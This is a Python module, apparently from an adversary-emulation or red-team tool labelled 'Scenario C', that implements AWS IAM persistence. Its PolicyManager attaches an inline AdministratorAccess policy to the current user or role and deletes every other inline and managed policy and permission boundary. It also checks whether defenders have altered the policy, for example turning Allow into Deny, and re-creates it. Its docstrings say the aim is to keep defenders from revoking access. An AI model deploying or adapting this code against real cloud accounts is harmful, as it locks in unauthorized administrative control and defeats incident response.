"""
Policy Management Scenario (Scenario C).

This module implements the policy management technique that maintains
administrative access by ensuring a notyet policy is always attached and
all other policies are removed. This prevents defenders from revoking
permissions through policy changes.
"""

import json
import logging
from typing import Any, Dict, Optional
from urllib.parse import unquote
from botocore.exceptions import ClientError

from .aws_clients import IAMClient
from .models import CallerIdentity, PolicyDocument
from .resource_names import generate_policy_name


logger = logging.getLogger(__name__)


class PolicyManager:
    """
    Manages IAM policies to maintain administrative access.
    
    This class ensures that a notyet policy with AdministratorAccess permissions
    is always attached to the current identity, and removes all other policies
    (inline, managed, session policies, and permission boundaries) to prevent
    defenders from restricting access.
    
    Attributes:
        iam: IAM client for AWS API operations
        logger: Logger instance for operation logging
        notyet_policy_name: Name of the currently attached notyet policy
    """
    
    def __init__(self, iam_client: IAMClient, logger_instance: logging.Logger = None):
        """
        Initialize PolicyManager.
        
        Args:
            iam_client: IAM client for AWS operations
            logger_instance: Optional logger instance (defaults to module logger)
        """
        self.iam = iam_client
        self.logger = logger_instance or logger
        self.notyet_policy_name: Optional[str] = None
    
    def establish_policy(self, identity: CallerIdentity) -> str:
        """
        Establish the notyet policy and remove all other policies.
        
        This method performs the complete policy management flow:
        1. Create and attach notyet policy with AdministratorAccess
        2. Detach all other inline policies
        3. Detach all managed policies
        4. Remove session policies (if applicable)
        5. Remove permission boundaries
        
        Args:
            identity: CallerIdentity object with identity information
        
        Returns:
            str: The name of the attached notyet policy
        
        Raises:
            ClientError: If any AWS API operation fails
        """
        self.logger.info(f"Establishing notyet policy for {identity.identity_type}: {identity.identity_name}")
        
        # Step 1: Generate policy name and attach notyet policy
        policy_name = generate_policy_name()
        self.logger.info(f"Creating notyet policy: {policy_name}")
        
        admin_policy = PolicyDocument.administrator_access()
        
        if identity.identity_type == "user":
            self.iam.put_user_policy(
                user_name=identity.identity_name,
                policy_name=policy_name,
                policy_document=admin_policy.to_json()
            )
        elif identity.identity_type == "role":
            self.iam.put_role_policy(
                role_name=identity.identity_name,
                policy_name=policy_name,
                policy_document=admin_policy.to_json()
            )
        else:
            raise ValueError(f"Unsupported identity type: {identity.identity_type}")
        
        self.notyet_policy_name = policy_name
        self.logger.info(f"Notyet policy {policy_name} attached successfully")
        
        # Step 2: Detach all other inline policies
        self._remove_other_inline_policies(identity)
        
        # Step 3: Detach all managed policies
        self._remove_managed_policies(identity)
        
        # Step 4: Remove session policies (if applicable)
        # Note: Session policies are set during AssumeRole and cannot be removed
        # after the fact. This is a no-op for now but included for completeness.
        
        # Step 5: Remove permission boundaries
        self._remove_permission_boundaries(identity)
        
        self.logger.info(f"Policy establishment complete. Notyet policy: {policy_name}")
        return policy_name
    
    def verify_policy(self, identity: CallerIdentity) -> bool:
        """
        Verify that the notyet policy is still attached.
        
        Args:
            identity: CallerIdentity object with identity information
        
        Returns:
            bool: True if the notyet policy is attached, False otherwise
        """
        if not self.notyet_policy_name:
            return False
        
        try:
            if identity.identity_type == "user":
                response = self.iam.list_user_policies(user_name=identity.identity_name)
                policy_names = response.get('PolicyNames', [])
            elif identity.identity_type == "role":
                response = self.iam.list_role_policies(role_name=identity.identity_name)
                policy_names = response.get('PolicyNames', [])
            else:
                self.logger.error(f"Unsupported identity type: {identity.identity_type}")
                return False
            
            is_attached = self.notyet_policy_name in policy_names

            if not is_attached:
                self.logger.warning(f"Notyet policy {self.notyet_policy_name} is NOT attached")
                return False

            # Verify policy content hasn't been tampered with (e.g., Allow → Deny)
            if not self._verify_policy_content(identity):
                self.logger.warning(
                    f"Notyet policy {self.notyet_policy_name} content has been modified"
                )
                return False

            return True
        
        except ClientError as e:
            error_code = e.response.get('Error', {}).get('Code', 'Unknown')
            error_message = e.response.get('Error', {}).get('Message', 'No message')
            self.logger.error(
                f"AWS API error verifying policy on {identity.identity_name}: "
                f"{error_code} - {error_message}"
            )
            return False
        except Exception as e:
            self.logger.error(
                f"Unexpected error verifying policy on {identity.identity_name}: {str(e)}",
                exc_info=True
            )
            return False
    
    def restore_policy(self, identity: CallerIdentity) -> None:
        """
        Restore the notyet policy if it's missing.
        
        This method recreates the notyet policy with the same name if it has
        been detached or deleted.
        
        Args:
            identity: CallerIdentity object with identity information
        
        Raises:
            ClientError: If any AWS API operation fails
        """
        if not self.notyet_policy_name:
            self.logger.error("No notyet policy name stored, cannot restore")
            return
        
        self.logger.info(f"Restoring notyet policy {self.notyet_policy_name} for {identity.identity_name}")
        
        admin_policy = PolicyDocument.administrator_access()
        
        try:
            if identity.identity_type == "user":
                self.iam.put_user_policy(
                    user_name=identity.identity_name,
                    policy_name=self.notyet_policy_name,
                    policy_document=admin_policy.to_json()
                )
            elif identity.identity_type == "role":
                self.iam.put_role_policy(
                    role_name=identity.identity_name,
                    policy_name=self.notyet_policy_name,
                    policy_document=admin_policy.to_json()
                )
            else:
                raise ValueError(f"Unsupported identity type: {identity.identity_type}")
            
            self.logger.info(f"Notyet policy {self.notyet_policy_name} restored successfully")
        
        except Exception as e:
            self.logger.error(f"Error restoring policy: {str(e)}")
            raise
    
    def _verify_policy_content(self, identity: CallerIdentity) -> bool:
        """
        Verify that the notyet policy document content matches the expected
        AdministratorAccess policy. Detects tampering such as changing Allow to Deny.

        Args:
            identity: CallerIdentity object with identity information

        Returns:
            bool: True if policy content matches expected, False otherwise
        """
        try:
            if identity.identity_type == "user":
                response = self.iam._retry_with_backoff(
                    'get_user_policy',
                    UserName=identity.identity_name,
                    PolicyName=self.notyet_policy_name
                )
            elif identity.identity_type == "role":
                response = self.iam._retry_with_backoff(
                    'get_role_policy',
                    RoleName=identity.identity_name,
                    PolicyName=self.notyet_policy_name
                )
            else:
                return False

            policy_doc = response.get('PolicyDocument', {})
            # AWS may return the policy document as a URL-encoded JSON string
            if isinstance(policy_doc, str):
                policy_doc = json.loads(unquote(policy_doc))

            return self._policy_matches(policy_doc)

        except Exception as e:
            self.logger.warning(f"Error verifying policy content: {str(e)}")
            # If we can't verify, assume it's been tampered with
            return False

    def _policy_matches(self, policy_doc: Dict[str, Any]) -> bool:
        """
        Check if a policy document matches the expected AdministratorAccess policy.

        Args:
            policy_doc: The policy document dict to check

        Returns:
            bool: True if the policy grants Allow on all actions and resources
        """
        statements = policy_doc.get('Statement', [])
        if not statements:
            return False

        for stmt in statements:
            effect = stmt.get('Effect', '')
            action = stmt.get('Action', '')
            resource = stmt.get('Resource', '')
            if effect == 'Allow' and action == '*' and resource == '*':
                return True

        return False

    def _remove_other_inline_policies(self, identity: CallerIdentity) -> None:
        """
        Remove all inline policies except the notyet policy.
        
        Args:
            identity: CallerIdentity object with identity information
        """
        try:
            if identity.identity_type == "user":
                response = self.iam.list_user_policies(user_name=identity.identity_name)
                policy_names = response.get('PolicyNames', [])
                
                for policy_name in policy_names:
                    if policy_name != self.notyet_policy_name:
                        self.logger.info(f"Detaching inline policy: {policy_name}")
                        self.iam.delete_user_policy(
                            user_name=identity.identity_name,
                            policy_name=policy_name
                        )
            
            elif identity.identity_type == "role":
                response = self.iam.list_role_policies(role_name=identity.identity_name)
                policy_names = response.get('PolicyNames', [])
                
                for policy_name in policy_names:
                    if policy_name != self.notyet_policy_name:
                        self.logger.info(f"Detaching inline policy: {policy_name}")
                        self.iam.delete_role_policy(
                            role_name=identity.identity_name,
                            policy_name=policy_name
                        )
        
        except Exception as e:
            error_str = str(e)
            # If this is an eventual consistency error (InvalidClientTokenId), it's expected
            # for newly created users/roles and can be safely ignored
            if "InvalidClientTokenId" in error_str or "InvalidAccessKeyId" in error_str:
                self.logger.debug(
                    f"Eventual consistency delay when listing inline policies for {identity.identity_name}. "
                    f"This is expected for newly created identities and can be ignored."
                )
            else:
                self.logger.error(f"Error removing inline policies: {error_str}")
            # Continue execution even if this fails
    
    def _remove_managed_policies(self, identity: CallerIdentity) -> None:
        """
        Remove all managed policies.
        
        Args:
            identity: CallerIdentity object with identity information
        """
        try:
            if identity.identity_type == "user":
                response = self.iam.list_attached_user_policies(user_name=identity.identity_name)
                attached_policies = response.get('AttachedPolicies', [])
                
                for policy in attached_policies:
                    policy_arn = policy['PolicyArn']
                    self.logger.info(f"Detaching managed policy: {policy_arn}")
                    self.iam.detach_user_policy(
                        user_name=identity.identity_name,
                        policy_arn=policy_arn
                    )
            
            elif identity.identity_type == "role":
                response = self.iam.list_attached_role_policies(role_name=identity.identity_name)
                attached_policies = response.get('AttachedPolicies', [])
                
                for policy in attached_policies:
                    policy_arn = policy['PolicyArn']
                    self.logger.info(f"Detaching managed policy: {policy_arn}")
                    self.iam.detach_role_policy(
                        role_name=identity.identity_name,
                        policy_arn=policy_arn
                    )
        
        except Exception as e:
            error_str = str(e)
            # If this is an eventual consistency error (InvalidClientTokenId), it's expected
            # for newly created users/roles and can be safely ignored
            if "InvalidClientTokenId" in error_str or "InvalidAccessKeyId" in error_str:
                self.logger.debug(
                    f"Eventual consistency delay when listing managed policies for {identity.identity_name}. "
                    f"This is expected for newly created identities and can be ignored."
                )
            else:
                self.logger.error(f"Error removing managed policies: {error_str}")
            # Continue execution even if this fails
    
    def _remove_permission_boundaries(self, identity: CallerIdentity) -> None:
        """
        Remove permission boundaries.
        
        Args:
            identity: CallerIdentity object with identity information
        """
        try:
            # Note: We need to check if a permission boundary exists first
            # The IAM API doesn't have a direct "remove permission boundary" call
            # We need to use delete_user_permissions_boundary or delete_role_permissions_boundary
            
            if identity.identity_type == "user":
                # Try to get user details to check for permission boundary
                try:
                    response = self.iam._retry_with_backoff('get_user', UserName=identity.identity_name)
                    if 'PermissionsBoundary' in response.get('User', {}):
                        self.logger.info("Removing user permission boundary")
                        self.iam._retry_with_backoff(
                            'delete_user_permissions_boundary',
                            UserName=identity.identity_name
                        )
                except Exception as e:
                    self.logger.warning(f"Could not check/remove user permission boundary: {str(e)}")
            
            elif identity.identity_type == "role":
                # Try to get role details to check for permission boundary
                try:
                    response = self.iam._retry_with_backoff('get_role', RoleName=identity.identity_name)
                    if 'PermissionsBoundary' in response.get('Role', {}):
                        self.logger.info("Removing role permission boundary")
                        self.iam._retry_with_backoff(
                            'delete_role_permissions_boundary',
                            RoleName=identity.identity_name
                        )
                except Exception as e:
                    self.logger.warning(f"Could not check/remove role permission boundary: {str(e)}")
        
        except Exception as e:
            self.logger.error(f"Error removing permission boundaries: {str(e)}")
            # Continue execution even if this fails
